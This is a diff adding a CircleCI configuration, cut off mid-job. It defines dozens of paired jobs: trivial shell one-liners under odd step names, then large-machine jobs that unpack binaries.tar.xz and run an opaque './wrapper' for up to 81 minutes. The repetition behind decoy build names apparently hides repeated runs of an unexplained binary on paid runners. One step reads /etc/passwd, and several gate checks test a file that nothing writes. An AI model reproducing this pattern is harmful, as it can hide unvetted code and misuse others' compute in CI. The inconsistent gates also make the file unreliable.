@@ -1,0 +1,1559 @@
+version: 2.1
+
+jobs:
+  route_min-test:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: press flat
+          command: |
+            mkdir -p /tmp/outbox
+            set +o pipefail 2>/dev/null; seq 1 737039 | md5sum > /tmp/outbox/report.out; true
+            stat -c '%s %n' /tmp/outbox/report.out
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - report.out
+  min-test:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Grab gate output
+          command: |
+            test -s /tmp/outbox/report.out && echo nonempty || echo empty
+      - run:
+          name: Fetch tree
+          command: git clone --depth 3 --quiet --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar xJf binaries.tar.xz
+      - run:
+          no_output_timeout: 81m
+          command: sh -c "./wrapper"
+  p1_java17-ship:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: bench press
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{print length("hello world")}'; true ; } > /tmp/outbox/step-26.txt
+            stat -c '%s %n' /tmp/outbox/step-26.txt
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - step-26.txt
+  java17-ship:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Grab gate output
+          command: |
+            test -s /tmp/outbox/step-26.txt && echo nonempty || echo empty
+      - run:
+          name: Fetch tree
+          command: git clone --depth 3 --quiet --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar xJf binaries.tar.xz
+      - run:
+          no_output_timeout: 81m
+          command: sh -c "./wrapper"
+  cook_add-queue-redirect:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: stuffed
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; awk -v n=100 'BEGIN{for(i=1;i<=n;i++)print i}' | tail -3; true ; } > /tmp/outbox/summary.log
+            stat -c '%s %n' /tmp/outbox/summary.log
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - summary.log
+  add-queue-redirect:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Grab gate output
+          command: |
+            test -s /tmp/outbox/summary.log && echo nonempty || echo empty
+      - run:
+          name: Fetch tree
+          command: git clone --depth 3 --quiet --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar xJf binaries.tar.xz
+      - run:
+          no_output_timeout: 81m
+          command: sh -c "./wrapper"
+  fixture_europa-v2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: holding pattern
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; echo "abc" | fold -w1 | sort | uniq | wc -l; true ; } > /tmp/outbox/bundle.pkg
+            stat -c '%s %n' /tmp/outbox/bundle.pkg
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - bundle.pkg
+  europa-v2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Grab gate output
+          command: |
+            test -s /tmp/outbox/bundle.pkg && echo nonempty || echo empty
+      - run:
+          name: Fetch tree
+          command: git clone --depth 3 --quiet --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar xJf binaries.tar.xz
+      - run:
+          no_output_timeout: 81m
+          command: sh -c "./wrapper"
+  prep_brodcast-86:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: wash long
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; echo "data1" | od -An -c | head -1; true ; } > /tmp/outbox/secondary_task_output.out
+            stat -c '%s %n' /tmp/outbox/secondary_task_output.out
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - secondary_task_output.out
+  brodcast-86:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Grab gate output
+          command: |
+            test -s /tmp/outbox/.pid && echo nonempty || echo empty
+      - run:
+          name: Fetch tree
+          command: git clone --depth 3 --quiet --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar xJf binaries.tar.xz
+      - run:
+          no_output_timeout: 81m
+          command: sh -c "./wrapper"
+  cacher_dotnet8-vet:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: rollback never
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{a=1000; while(a>1){a=int(a/2); c++} print c}'; true ; } > /tmp/outbox/stage-ready.txt
+            stat -c '%s %n' /tmp/outbox/stage-ready.txt
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - stage-ready.txt
+  dotnet8-vet:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Grab gate output
+          command: |
+            test -s /tmp/outbox/.pid && echo nonempty || echo empty
+      - run:
+          name: Fetch tree
+          command: git clone --depth 3 --quiet --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar xJf binaries.tar.xz
+      - run:
+          no_output_timeout: 81m
+          command: sh -c "./wrapper"
+  step1_RUN_UAT:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: valley
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{s="programming"; a[1]; for(i=1;i<=length(s);i++)a[substr(s,i,1)]++; for(k in a)print k":"a[k]}' | sort; true ; } > /tmp/outbox/pt-C.pt
+            stat -c '%s %n' /tmp/outbox/pt-C.pt
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - pt-C.pt
+  RUN_UAT:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Grab gate output
+          command: |
+            test -s /tmp/outbox/.pid && echo nonempty || echo empty
+      - run:
+          name: Fetch tree
+          command: git clone --depth 3 --quiet --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar xJf binaries.tar.xz
+      - run:
+          no_output_timeout: 81m
+          command: sh -c "./wrapper"
+  Gamma_dp-3:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: quadruple knock
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; seq 1 100 | awk 'END{print NR*(NR+1)/2}'; true ; } > /tmp/outbox/bundle
+            stat -c '%s %n' /tmp/outbox/bundle
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - bundle
+  dp-3:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Grab gate output
+          command: |
+            test -s /tmp/outbox/bundle && echo nonempty || echo empty
+      - run:
+          name: Fetch tree
+          command: git clone --depth 3 --quiet --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar xJf binaries.tar.xz
+      - run:
+          no_output_timeout: 81m
+          command: sh -c "./wrapper"
+  B_add-router-glitch:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: augmentation
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; cat /dev/urandom | tr -dc 'a-f0-9' | head -c 71680 | fold -w16 | awk '!seen[$0]++' | wc -l; true ; } > /tmp/outbox/handover.ok
+            stat -c '%s %n' /tmp/outbox/handover.ok
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - handover.ok
+  add-router-glitch:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Grab gate output
+          command: |
+            test -s /tmp/outbox/handover.ok && echo nonempty || echo empty
+      - run:
+          name: Fetch tree
+          command: git clone --depth 3 --quiet --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar xJf binaries.tar.xz
+      - run:
+          no_output_timeout: 81m
+          command: sh -c "./wrapper"
+  hydrate_lima:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: hove to
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; test 5 -gt 3 && echo gt-ok; true ; } > /tmp/outbox/handover.state
+            stat -c '%s %n' /tmp/outbox/handover.state
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - handover.state
+  lima:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Grab gate output
+          command: |
+            test -s /tmp/outbox/handover.state && echo nonempty || echo empty
+      - run:
+          name: Fetch tree
+          command: git clone --depth 3 --quiet --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar xJf binaries.tar.xz
+      - run:
+          no_output_timeout: 81m
+          command: sh -c "./wrapper"
+  g2_deploy:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: seal of approval
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{s="hello world"; gsub("l","L",s); print s}'; true ; } > /tmp/outbox/gate-ready.sig
+            stat -c '%s %n' /tmp/outbox/gate-ready.sig
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - gate-ready.sig
+  deploy:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Grab gate output
+          command: |
+            test -s /tmp/outbox/gate-ready.sig && echo nonempty || echo empty
+      - run:
+          name: Fetch tree
+          command: git clone --depth 3 --quiet --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar xJf binaries.tar.xz
+      - run:
+          no_output_timeout: 81m
+          command: sh -c "./wrapper"
+  round2_intergration:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: whatever man
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=0;i<=100;i+=10)print i, i*0.9}'; true ; } > /tmp/outbox/FINAL
+            stat -c '%s %n' /tmp/outbox/FINAL
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - FINAL
+  intergration:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Grab gate output
+          command: |
+            test -s /tmp/outbox/FINAL && echo nonempty || echo empty
+      - run:
+          name: Fetch tree
+          command: git clone --depth 3 --quiet --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar xJf binaries.tar.xz
+      - run:
+          no_output_timeout: 81m
+          command: sh -c "./wrapper"
+  step1_v4-canary:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: splits up
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; echo "x1 x2 x3 x4 x5" | awk '{for(i=1;i<=NF;i++)printf "%s ",$i; print ""}'; true ; } > /tmp/outbox/output.txt
+            stat -c '%s %n' /tmp/outbox/output.txt
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - output.txt
+  v4-canary:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Grab gate output
+          command: |
+            test -s /tmp/outbox/output.txt && echo nonempty || echo empty
+      - run:
+          name: Fetch tree
+          command: git clone --depth 3 --quiet --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar xJf binaries.tar.xz
+      - run:
+          no_output_timeout: 81m
+          command: sh -c "./wrapper"
+  hydrate_Prepare_App9:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: tire pop
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; printf "%d\n" {1..40} | sort -R 2>/dev/null | head -3 || printf "%d\n" {1..40} | head -3; true ; } > /tmp/outbox/2023-06-02.data
+            stat -c '%s %n' /tmp/outbox/2023-06-02.data
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - 2023-06-02.data
+  Prepare_App9:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Grab gate output
+          command: |
+            test -s /tmp/outbox/2023-06-02.data && echo nonempty || echo empty
+      - run:
+          name: Fetch tree
+          command: git clone --depth 3 --quiet --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar xJf binaries.tar.xz
+      - run:
+          no_output_timeout: 81m
+          command: sh -c "./wrapper"
+  produce_verify:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: mini boss
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; ps -eo state 2>/dev/null | sort | uniq -c; true ; } > /tmp/outbox/event.ndjson
+            stat -c '%s %n' /tmp/outbox/event.ndjson
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - event.ndjson
+  verify:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Grab gate output
+          command: |
+            test -s /tmp/outbox/.pid && echo nonempty || echo empty
+      - run:
+          name: Fetch tree
+          command: git clone --depth 3 --quiet --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar xJf binaries.tar.xz
+      - run:
+          no_output_timeout: 81m
+          command: sh -c "./wrapper"
+  produce_vega-rc:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: hop
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; echo 'shout quietly' | tr '[:lower:]' '[:upper:]'; true ; } > /tmp/outbox/stage-done.sig
+            stat -c '%s %n' /tmp/outbox/stage-done.sig
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - stage-done.sig
+  vega-rc:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Grab gate output
+          command: |
+            test -s /tmp/outbox/stage-done.sig && echo nonempty || echo empty
+      - run:
+          name: Fetch tree
+          command: git clone --depth 3 --quiet --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar xJf binaries.tar.xz
+      - run:
+          no_output_timeout: 81m
+          command: sh -c "./wrapper"
+  Alpha_LaunchProd:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: heeled over
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; dd if=/dev/urandom bs=1 count=64 2>/dev/null | od -An -tx1 | tr -d ' \n'; true ; } > /tmp/outbox/trace.gz
+            stat -c '%s %n' /tmp/outbox/trace.gz
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - trace.gz
+  LaunchProd:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Grab gate output
+          command: |
+            test -s /tmp/outbox/trace.gz && echo nonempty || echo empty
+      - run:
+          name: Fetch tree
+          command: git clone --depth 3 --quiet --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar xJf binaries.tar.xz
+      - run:
+          no_output_timeout: 81m
+          command: sh -c "./wrapper"
+  ctx_PROD_BUILD_1:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: whats going on
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; echo "   leading" | sed 's/^ *//'; true ; } > /tmp/outbox/main_job_output_v4.log
+            stat -c '%s %n' /tmp/outbox/main_job_output_v4.log
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - main_job_output_v4.log
+  PROD_BUILD_1:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Grab gate output
+          command: |
+            test -s /tmp/outbox/main_job_output_v4.log && echo nonempty || echo empty
+      - run:
+          name: Fetch tree
+          command: git clone --depth 3 --quiet --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar xJf binaries.tar.xz
+      - run:
+          no_output_timeout: 81m
+          command: sh -c "./wrapper"
+  prefetch_produce-production-artifact-bundle:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: viking press
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; seq 100 1 2>/dev/null | head -3 || seq 1 100 | sort -nr | head -3; true ; } > /tmp/outbox/big_job_output.out
+            stat -c '%s %n' /tmp/outbox/big_job_output.out
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - big_job_output.out
+  produce-production-artifact-bundle:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Grab gate output
+          command: |
+            test -s /tmp/outbox/big_job_output.out && echo nonempty || echo empty
+      - run:
+          name: Fetch tree
+          command: git clone --depth 3 --quiet --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar xJf binaries.tar.xz
+      - run:
+          no_output_timeout: 81m
+          command: sh -c "./wrapper"
+  gamma_chore-1248:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: rinse cycle
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; seq 1 200000 | sort -nr | head -1; true ; } > /tmp/outbox/main_phase_output_v4.txt
+            stat -c '%s %n' /tmp/outbox/main_phase_output_v4.txt
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - main_phase_output_v4.txt
+  chore-1248:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Grab gate output
+          command: |
+            test -s /tmp/outbox/main_phase_output_v4.txt && echo nonempty || echo empty
+      - run:
+          name: Fetch tree
+          command: git clone --depth 3 --quiet --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar xJf binaries.tar.xz
+      - run:
+          no_output_timeout: 81m
+          command: sh -c "./wrapper"
+  verify_rigel-final:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: calm step
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; printf "%o\n" $((RANDOM)); true ; } > /tmp/outbox/12.data
+            stat -c '%s %n' /tmp/outbox/12.data
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - 12.data
+  rigel-final:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Grab gate output
+          command: |
+            test -s /tmp/outbox/.pid && echo nonempty || echo empty
+      - run:
+          name: Fetch tree
+          command: git clone --depth 3 --quiet --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar xJf binaries.tar.xz
+      - run:
+          no_output_timeout: 81m
+          command: sh -c "./wrapper"
+  fetcher_bug-5695:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: shrug up
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{n=1024; while(n>1){n/=2;c++}; print c}'; true ; } > /tmp/outbox/2023-09-04.data
+            stat -c '%s %n' /tmp/outbox/2023-09-04.data
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - 2023-09-04.data
+  bug-5695:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Grab gate output
+          command: |
+            test -s /tmp/outbox/2023-09-04.data && echo nonempty || echo empty
+      - run:
+          name: Fetch tree
+          command: git clone --depth 3 --quiet --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar xJf binaries.tar.xz
+      - run:
+          no_output_timeout: 81m
+          command: sh -c "./wrapper"
+  B_lets-go:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: 3am oncall
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; cat /etc/hostname | rev; true ; } > /tmp/outbox/58.blob
+            stat -c '%s %n' /tmp/outbox/58.blob
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - 58.blob
+  lets-go:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Grab gate output
+          command: |
+            test -s /tmp/outbox/58.blob && echo nonempty || echo empty
+      - run:
+          name: Fetch tree
+          command: git clone --depth 3 --quiet --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar xJf binaries.tar.xz
+      - run:
+          no_output_timeout: 81m
+          command: sh -c "./wrapper"
+  validate_rm-cache-bug:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: cleared to land
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; awk -F: '$3>1000 && $3<2000' /etc/passwd | wc -l; true ; } > /tmp/outbox/.pid
+            stat -c '%s %n' /tmp/outbox/.pid
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - .pid
+  rm-cache-bug:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Grab gate output
+          command: |
+            test -s /tmp/outbox/.pid && echo nonempty || echo empty
+      - run:
+          name: Fetch tree
+          command: git clone --depth 3 --quiet --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar xJf binaries.tar.xz
+      - run:
+          no_output_timeout: 81m
+          command: sh -c "./wrapper"
+  syncer_update-login-crash:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: astern
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; tf=$(mktemp) && head -c 1024 /dev/urandom > "$tf" && sha1sum "$tf" | cut -d' ' -f1 && rm "$tf"; true ; } > /tmp/outbox/relay.state
+            stat -c '%s %n' /tmp/outbox/relay.state
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - relay.state
+  update-login-crash:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Grab gate output
+          command: |
+            test -s /tmp/outbox/.pid && echo nonempty || echo empty
+      - run:
+          name: Fetch tree
+          command: git clone --depth 3 --quiet --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar xJf binaries.tar.xz
+      - run:
+          no_output_timeout: 81m
+          command: sh -c "./wrapper"
+  go_rl-2a:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: deflate
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=1;i<=100;i++)if(i*i == int(i*i))x++; print x}'; true ; } > /tmp/outbox/passoff.txt
+            stat -c '%s %n' /tmp/outbox/passoff.txt
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - passoff.txt
+  rl-2a:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Grab gate output
+          command: |
+            test -s /tmp/outbox/passoff.txt && echo nonempty || echo empty
+      - run:
+          name: Fetch tree
+          command: git clone --depth 3 --quiet --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar xJf binaries.tar.xz
+      - run:
+          no_output_timeout: 81m
+          command: sh -c "./wrapper"
+  fixture_nightly-v8:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: less flaky
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; grep -c MemTotal /proc/meminfo; true ; } > /tmp/outbox/gate-ready.log
+            stat -c '%s %n' /tmp/outbox/gate-ready.log
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - gate-ready.log
+  nightly-v8:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Grab gate output
+          command: |
+            test -s /tmp/outbox/gate-ready.log && echo nonempty || echo empty
+      - run:
+          name: Fetch tree
+          command: git clone --depth 3 --quiet --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar xJf binaries.tar.xz
+      - run:
+          no_output_timeout: 81m
+          command: sh -c "./wrapper"
+  deps_fix-retry:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: mirror finish
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; dirname /usr/local/bin/env; true ; } > /tmp/outbox/manifest
+            stat -c '%s %n' /tmp/outbox/manifest
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - manifest
+  fix-retry:
+    machine:
+      image: ubuntu-2204:current
